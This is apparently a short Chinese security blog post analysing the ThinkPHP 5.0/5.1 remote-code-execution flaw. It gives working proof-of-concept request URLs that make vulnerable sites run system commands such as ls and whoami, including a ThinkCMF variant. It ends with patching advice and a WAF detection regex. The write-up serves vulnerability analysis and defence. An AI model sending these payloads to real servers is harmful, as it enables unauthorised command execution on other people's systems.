---
layout: post
title:  "Thinkphp5 getshell漏洞分析"
---
# Thinkphp5 getshell漏洞分析

* 通杀所有使用了thinkphp5.0和5.1
* 实际上在不同使用thinkphp5开发的cms中getshell的参数会有差异

### 在thinkphp5 getshell poc
这是目前公开5.0.20的poc<br/>
/index.php?s=index/\think\app/invokefunction&function=call_user_func&var[0]=system&var[1]=ls<br/>
![图片0](https://github.com/white-cell/white-cell.github.io/raw/master/img/_post/8/0.jpg)<br />
调用过程如下<br/>
![图片1](https://github.com/white-cell/white-cell.github.io/raw/master/img/_post/8/1.jpg)<br />
详情分析：https://www.anquanke.com/post/id/167653<br/>
另外可利用的index/\think\request/input<br/>
传入data=ls name= default= filter=system<br/>
![图片2](https://github.com/white-cell/white-cell.github.io/raw/master/img/_post/8/2.jpg)<br />
通过call_user_func执行<br/>
![图片3](https://github.com/white-cell/white-cell.github.io/raw/master/img/_post/8/3.jpg)<br />
并不局限于以上两个方法，但一定是think\这个命名空间下的已知类<br/>
### thinkcmf利用过程区别
getshell poc<br/>
/public/index.php?s=portal/\think\app/invokefunction&function=call_user_func&function_name=system&parameters=whoami<br/>
![图片4](https://github.com/white-cell/white-cell.github.io/raw/master/img/_post/8/4.jpg)<br />
1.thinkcmf默认不存在index，这里我选用portal<br/>
![图片5](https://github.com/white-cell/white-cell.github.io/raw/master/img/_post/8/5.jpg)<br />
2.参数差异，这里要使用function_name parameters<br/>

### 防护
1.代码本身就更新thinkphp5，或修改代码。<br/>
2.防护设备可以匹配s=.*?/\\\\think\\\\.*?来判定，解释下s参数是thinkphp5 var_pathinfo的默认配置为s，利用的类目前也都是在think\这个命名空间下的已知类。<br/>